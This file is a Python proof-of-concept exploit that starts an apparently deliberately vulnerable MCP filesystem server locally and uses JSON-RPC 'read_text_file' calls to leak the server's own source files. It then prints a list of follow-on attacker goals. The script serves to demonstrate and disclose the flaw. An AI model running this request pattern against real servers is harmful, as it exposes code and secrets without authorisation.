#!/usr/bin/env python3
"""
Proof of Concept: Server Code Leakage Vulnerability
Demonstrates how the vulnerable MCP Filesystem Server exposes its own source code.

This script:
1. Launches the vulnerable server as a subprocess
2. Sends JSON-RPC requests to read the server's own source files
3. Displays the leaked source code to demonstrate the vulnerability
"""

import subprocess
import json
import sys
import os
import platform

# Get the server directory path
server_dir = os.path.dirname(os.path.dirname(__file__))

# Determine the server path
server_path = os.path.join(server_dir, "dist", "index.js")
if not os.path.exists(server_path):
    # Fallback: try running with tsx if available
    server_path = os.path.join(server_dir, "index.ts")
    node_cmd = ["npx", "tsx", server_path]
else:
    node_cmd = ["node", server_path]

# Files to attempt to read (server's own source code)
target_files = [
    "./index.ts",
    "./lib.ts",
    "./path-utils.ts",
    "./path-validation.ts"
]

print("=" * 70)
print("SERVER CODE LEAKAGE VULNERABILITY - PROOF OF CONCEPT")
print("=" * 70)
print()
print(f"[*] Starting vulnerable MCP Filesystem Server...")
print(f"[*] Server command: {' '.join(node_cmd)}")
print(f"[*] Server directory: {server_dir}")
print(f"[*] Target files: {', '.join(target_files)}")
print()

# Launch the server process
try:
    server_process = subprocess.Popen(
        node_cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
        cwd=server_dir
    )
except Exception as e:
    print(f"[!] Error starting server: {e}")
    print(f"[!] Make sure Node.js is installed and the server is built (run 'npm run build')")
    sys.exit(1)

# Wait a moment for server to initialize
import time
time.sleep(1)

# Send initialization request
init_request = {
    "jsonrpc": "2.0",
    "id": 1,
    "method": "initialize",
    "params": {
        "protocolVersion": "2024-11-05",
        "capabilities": {},
        "clientInfo": {
            "name": "poc-client",
            "version": "1.0.0"
        }
    }
}

print("[*] Sending initialize request...")
server_process.stdin.write(json.dumps(init_request) + "\n")
server_process.stdin.flush()

# Read initialization response
try:
    init_response = server_process.stdout.readline()
    if init_response:
        print(f"[+] Server initialized")
except Exception as e:
    print(f"[!] Error reading init response: {e}")

# Send initialized notification
initialized_notification = {
    "jsonrpc": "2.0",
    "method": "notifications/initialized"
}
server_process.stdin.write(json.dumps(initialized_notification) + "\n")
server_process.stdin.flush()

time.sleep(0.5)

# Try to read each target file
leaked_files = []
for i, target_file in enumerate(target_files, start=2):
    exploit_request = {
        "jsonrpc": "2.0",
        "id": i,
        "method": "tools/call",
        "params": {
            "name": "read_text_file",
            "arguments": {
                "path": target_file
            }
        }
    }
    
    print(f"[*] Attempting to read: {target_file}")
    print("[!] VULNERABILITY: This should be blocked but isn't due to exposed server directory")
    print()
    
    server_process.stdin.write(json.dumps(exploit_request) + "\n")
    server_process.stdin.flush()
    
    # Read the response
    try:
        response_line = server_process.stdout.readline()
        if response_line:
            response = json.loads(response_line)
            
            if "result" in response:
                print(f"[+] LEAKED SERVER SOURCE CODE: {target_file}")
                print("=" * 70)
                
                # Extract content from response
                content_text = ""
                if "content" in response["result"]:
                    content = response["result"]["content"]
                    if isinstance(content, list) and len(content) > 0:
                        if "text" in content[0]:
                            content_text = content[0]["text"]
                        elif isinstance(content[0], str):
                            content_text = content[0]
                    elif isinstance(content, str):
                        content_text = content
                elif "structuredContent" in response["result"]:
                    sc = response["result"]["structuredContent"]
                    if "content" in sc:
                        content_text = sc["content"] if isinstance(sc["content"], str) else str(sc["content"])
                
                # Display first 500 characters (redacted for brevity)
                if len(content_text) > 500:
                    print(content_text[:500])
                    print(f"\n... (truncated, {len(content_text)} total characters) ...")
                else:
                    print(content_text)
                
                print("=" * 70)
                print()
                leaked_files.append(target_file)
            elif "error" in response:
                print(f"[!] Server returned error for {target_file}: {response['error']}")
                print()
            else:
                print(f"[?] Unexpected response for {target_file}: {json.dumps(response, indent=2)}")
                print()
    except json.JSONDecodeError as e:
        print(f"[!] Error parsing response for {target_file}: {e}")
        print(f"[!] Raw response: {response_line}")
        print()
    except Exception as e:
        print(f"[!] Error reading response for {target_file}: {e}")
        print()

# Summary
print()
print("=" * 70)
print("EXPLOIT SUMMARY")
print("=" * 70)
if leaked_files:
    print(f"[!] VULNERABILITY CONFIRMED: Successfully leaked {len(leaked_files)} server source files:")
    for f in leaked_files:
        print(f"    - {f}")
    print()
    print("[!] This demonstrates Server Code Leakage in the MCP Resource Layer + Server Code Surface")
    print("[!] Attackers can now:")
    print("    - Understand server implementation details")
    print("    - Identify additional vulnerabilities")
    print("    - Discover hardcoded secrets or credentials")
    print("    - Plan more sophisticated attacks")
else:
    print("[*] No files were successfully leaked (vulnerability may be patched)")
print("=" * 70)

# Clean up
server_process.terminate()
try:
    server_process.wait(timeout=2)
except subprocess.TimeoutExpired:
    server_process.kill()

print()
print("[*] POC completed")

